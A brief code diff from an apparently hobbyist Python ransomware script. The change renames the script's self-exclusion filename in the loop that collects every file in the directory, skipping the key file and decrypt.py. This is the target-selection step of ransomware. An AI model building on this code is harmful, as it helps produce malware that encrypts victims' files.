@@ -5,7 +5,7 @@ from colorama import Fore
 files = []
 
 for file in os.listdir():
-    if file == "ransomware test.py" or file == "thekey.key" or file == "decrypt.py":
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
